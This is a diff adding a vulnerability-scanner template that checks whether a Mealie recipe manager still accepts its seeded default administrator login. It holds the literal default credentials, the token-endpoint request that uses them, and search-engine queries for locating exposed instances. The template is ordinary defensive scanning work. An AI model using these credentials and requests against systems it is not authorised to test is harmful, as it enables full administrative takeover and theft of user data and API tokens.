@@ -1,0 +1,71 @@
+id: mealie-default-login
+
+info:
+  name: Mealie - Default Login
+  author: s4e-io
+  severity: high
+  description: |
+    Mealie creates the administrator account changeme@example.com with the password MyPassword on first start when the database has no users, and the password remains valid until it is changed. An attacker who logs in with these credentials gains full administrative control over the recipe manager, including users, groups, households, backups, site settings and API tokens.
+  reference:
+    - https://mealie.io/documentation/getting-started/installation/installation-checklist/
+    - https://github.com/mealie-recipes/mealie/blob/v3.31.0/mealie/core/settings/settings.py
+    - https://github.com/mealie-recipes/mealie/blob/v3.31.0/mealie/repos/seed/init_users.py
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+    cpe: cpe:2.3:a:mealie:mealie:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    vendor: mealie
+    product: mealie
+    shodan-query: http.title:"Mealie"
+    fofa-query: title="Mealie"
+  tags: mealie,default-login
+
+flow: http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/app/about/startup-info"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "application/json")'
+          - 'regex("\"isFirstLogin\"\\s*:\\s*true", body)'
+          - '!regex("\"isDemo\"\\s*:\\s*true", body)'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST /api/auth/token HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{url_encode(username)}}&password={{password}}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - changeme@example.com
+      password:
+        - MyPassword
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "application/json")'
+          - 'regex("\"access_token\"\\s*:\\s*\"eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\"", body)'
+          - 'regex("\"token_type\"\\s*:\\s*\"bearer\"", body)'
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - username + ":" + password
+# digest: 4b0a0048304602210085cbc90013d1665b2f80179c8927106ef25bd2ec1bf154178121843acb5d75c4022100ec7c7a92284cc2f0a7a21d862dc1315becda9ebed00d377057d8716771de47e9:922c64590222798bb761d5b6d8e72950
